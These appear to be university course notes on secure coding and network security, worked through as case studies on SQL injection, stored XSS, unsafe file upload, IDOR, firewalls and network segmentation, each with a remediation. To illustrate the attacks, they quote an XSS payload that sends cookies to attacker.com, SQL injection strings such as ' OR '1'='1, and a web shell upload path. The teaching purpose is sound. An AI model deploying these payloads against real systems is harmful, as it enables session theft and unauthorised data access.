30th September 2026: Exploring Secure Coding Practices

Unit 3 · Secure Coding
Case Study 1

SQL Injection in an Online Examination Management System

Critical Severity
Scenario: A university develops an online examination management system. Teachers search student records using a student ID or name. The application dynamically constructs SQL queries through string concatenation:
query = "SELECT * FROM students WHERE student_id = '" + user_input + "'";
During security testing: database quotes cause syntax errors, arbitrary records are leaked using ' OR '1'='1, and internal database stack traces are returned to the user.
✅ Comprehensive Solution & Security Analysis
1. Identify the secure coding weaknesses in the application.
• Unsafe Dynamic SQL Construction: User input is concatenated directly into SQL command text instead of using parameterized queries.
• Information Leakage: Unhandled database exceptions reveal database schema, software versions, and query structure to clients.
• Excessive Database Privileges: The application database account runs with administrative/DBA privileges rather than least-privilege read access.
• Lack of Server-Side Input Validation: Input characters are not verified for expected format (alphanumeric/integer student ID).
2. Explain how parameterized queries prevent SQL injection.
Parameterized queries (prepared statements) pre-compile the SQL statement structure on the database engine first. User-supplied parameters are then bound strictly as literal data values, never as executable SQL syntax. Even if a user enters ' OR '1'='1' --, the database treats the entire string literally as a student ID string, completely neutralizing query hijacking.
3. Code Remediation Example (Python / Node.js style)
// VULNERABLE: cursor.execute("SELECT * FROM students WHERE student_id = '" + student_id + "'") // SECURE (Parameterized Binding): cursor.execute("SELECT name, roll_no, marks FROM students WHERE student_id = %s", (student_id,))
4. Why should database error messages never be displayed directly to end users?
Database error messages provide oracle feedback to an adversary (Error-Based SQL Injection). They reveal database vendor (PostgreSQL, MySQL, Oracle), table names, column structures, and syntax quirks. Secure applications must log detailed errors internally to protected log storage while presenting a generic error message (e.g., "Unable to process request") to the user.
Case Study 2

Cross-Site Scripting (XSS) in an E-Commerce Product Review Feature

High Severity
Scenario: An online shopping platform lets customers submit product reviews. The review text is stored directly in the database without sanitization. When another customer views the product page, the review is injected into the DOM via element.innerHTML = reviewText;. Session cookies lack the HttpOnly attribute.
✅ Comprehensive Solution & Security Analysis
1. Identify the specific type of XSS involved.
This is Stored XSS (Persistent XSS). The malicious payload (e.g. <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>) is saved persistently in the database and executed inside the browser of every visitor who loads the product reviews page.
2. Explain the difference between Input Validation and Output Encoding.
• Input Validation verifies whether data conforms to business rules (e.g. review length ≤ 500 characters, allowed characters). It answers: "Is this input acceptable?"
• Output Encoding converts dangerous characters into inert representations (e.g., < becomes &lt;, > becomes &gt;) at the exact point where data is rendered. It answers: "How can this data be safely displayed without executing as browser code?" Output encoding is the primary defense against XSS.
3. Code Remediation Example
// VULNERABLE (Treats input as HTML markup): reviewDiv.innerHTML = review.comment; // SECURE (Treats input strictly as text, browser auto-encodes): reviewDiv.textContent = review.comment;
4. Cookie Defense Attributes
Set Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict. The HttpOnly flag prevents JavaScript from accessing document.cookie, defeating credential theft even if an XSS vulnerability exists.
Case Study 3

Insecure Authentication & File Upload in Hospital Document Portal

Critical Severity
Scenario: A hospital intranet allows uploading patient medical documents. Passwords are stored using unsalted MD5. Password reset links never expire. Uploaded files are placed directly in /var/www/html/uploads/, relying solely on client filename extensions (.pdf).
✅ Comprehensive Solution & Security Analysis
1. What is the danger of storing uploaded files directly in the public web root?
An attacker can upload a web shell (e.g., exploit.php or shell.jsp disguised with a double extension or null byte) and invoke it directly by navigating to http://hospital.local/uploads/exploit.php. This achieves **Remote Code Execution (RCE)**, allowing full server compromise and theft of patient records.
2. What is the multi-layered secure file upload strategy?
1. Storage Location: Store files outside the public web root or in a dedicated object storage service (e.g. AWS S3 / private blob).
2. Disable Execution: Configure the web server to disable script execution in the upload directory.
3. File Renaming: Generate random UUIDs for stored files (e.g. 4a1f...9b2.bin) rather than preserving original user filenames.
4. Content Inspection: Validate file magic bytes (header signatures) server-side, not just client MIME types or extensions.
3. Password Storage Remediation
Replace MD5/SHA1 with modern adaptive slow hashing algorithms: Argon2id (recommended) or bcrypt (cost factor ≥ 12) with a unique cryptographically random salt per user.

28th September 2026: OWASP Top 10 Framework

Unit 3 · OWASP Top 10
Case Study 1

E-Commerce Application: Broken Access Control (IDOR / BOLA)

OWASP A01:2021 / 2025
Scenario: An online fashion retailer lets users view past invoices. Order URLs follow the pattern https://store.local/order/1001. By changing the URL parameter to 1002, User A can view User B's full address, invoice amount, and phone number without any authentication error.
✅ Comprehensive Solution & Security Analysis
1. Identify the OWASP category and specific vulnerability name.
This is OWASP A01: Broken Access Control, specifically an Insecure Direct Object Reference (IDOR), also classified as Broken Object Level Authorization (BOLA) in API security.
2. What authorization check must be enforced before serving the invoice?
The server must query the database combining the requested object identifier with the current authenticated user's session ID:
SELECT * FROM orders WHERE order_id = ? AND user_id = current_authenticated_user_id;
If no record matches, return 404 Not Found or 403 Forbidden. Never trust client-supplied ID parameters without verifying ownership.
Case Study 2

University Portal: Sensitive Data & Outdated Components

OWASP A02 & A06
Scenario: A college portal uses an unpatched version of jQuery (v1.9) with known prototype pollution and XSS CVEs. Passwords are transmitted in plain HTTP over the campus Wi-Fi network.
✅ Comprehensive Solution & Security Analysis
1. Identify the risks of using outdated third-party libraries.
Known CVEs in widely used libraries have public exploit payloads. Automated vulnerability scanners like OWASP ZAP or Nuclei immediately identify known versions and execute exploits without needing custom development. Maintain an active Software Bill of Materials (SBOM) and run automated dependency audits (e.g. npm audit, Snyk).
2. Why must HTTPS be mandatory even inside internal campus Wi-Fi?
Cleartext HTTP is vulnerable to local packet sniffing and ARP cache poisoning by any student on the same wireless broadcast domain. Enforcing HTTPS with HSTS guarantees confidentiality and integrity between the browser and web server.

Activity 2: Network Security, Firewalls & Traffic Control

Unit 2 · Network Security
Core Technical Case

TCP SYN Packet Evaluation & Stateful Inspection Mechanisms

Firewall Rule Decision Engine
Scenario: A firewall receives a TCP SYN packet destined for an internal server at 192.168.10.25:443. The network administrator must evaluate which packet factors dictate whether the packet is accepted, dropped, or rejected.
✅ Comprehensive Solution & Security Analysis
1. Which factors determine whether a TCP SYN packet is permitted?
• Source IP Address: Checked against ingress filtering and geo-blocking/threat lists.
• Destination IP Address: Validates whether the target host exists in an accessible zone (e.g. DMZ).
• Destination Port (443): Matches configured service allowance rules.
• Security Policy Action: Default-Deny rule evaluation.
• State Table Status: For SYN packets, stateful firewalls check that no anomalous duplicate half-open session exists.
2. Why does allowing outbound TCP/443 create an enterprise security risk?
Because modern malware, backdoors, and ransomware Command-and-Control (C2) agents tunnel their traffic over outbound port 443 to blend into normal HTTPS browsing. Without SSL Decryption / TLS Inspection, traditional firewalls cannot see malicious commands or exfiltrated data.

18th & 21st September: Kali Linux & Campus Network Security

Unit 1 & 2 · Labs & Architecture
18th Sep Lab Case

Kali Linux VM Containment & Safe Scanning Rules

Lab Setup
Scenario: A college establishes an ethical hacking laboratory. Students use Kali Linux to practice network discovery using Nmap. The instructor mandates Host-Only virtual networking.
✅ Solution & Best Practices
Why is Host-Only or Internal Network configuration mandatory?
Host-Only adapters isolate VM network traffic strictly to the virtual hypervisor switch on the host machine. This prevents port scanning traffic, Metasploit payloads, or accidental exploit packets from traversing the physical college network, tripping campus security alarms, or reaching external third parties.
21st Sep Architecture Case

University Network Security: Segmentation & DMZ Design

Network Architecture
Scenario: A university campus network connects student Wi-Fi, computer labs, library computers, and high-security administrative servers on a flat network. Unauthorized lateral probing occurs.
✅ Solution & Network Segmentation Architecture
Remediation Architecture:
1. VLAN Segmentation: Separate into VLAN 10 (Students), VLAN 20 (Faculty), VLAN 30 (Labs), VLAN 40 (Admin), and VLAN 50 (DMZ).
2. Internal Firewall (East-West Traffic Inspection): Enforce strict ACLs prohibiting student/lab subnets from initiating connections into the administrative VLAN.
3. DMZ Placement: Public web portals reside in the DMZ. DMZ servers are blocked from directly initiating queries into internal databases.

23rd Sept & Activity 1.3: Proxies & University Portal Scoping

Unit 1 & 2 · Scoping & Intermediaries
23rd Sep Case

Proxy Servers for Web Access Control & Caching

Proxy Design
✅ Solution Summary
Forward vs Reverse Proxy Summary:
• Forward Proxy: Sits in front of internal clients to monitor outbound web browsing, block prohibited URLs, cache frequent downloads, and log destinations.
• Reverse Proxy: Sits in front of internal web servers to provide load balancing, SSL termination, and caching, shielding internal IPs from the Internet.
Activity 1.3 Case

Security Assessment of a University Web Portal: Rules of Engagement

Ethical Boundaries
✅ Rules of Engagement & Scoping Checklist
Why must real student records never be viewed or modified?
Viewing or modifying real records violates Indian cyber law (IT Act, 2000 Section 43/66) and data privacy rules (DPDP Rules, 2025). Testing must strictly occur on synthetic test accounts in a staging or sandboxed environment under a written Scope of Work (SOW).
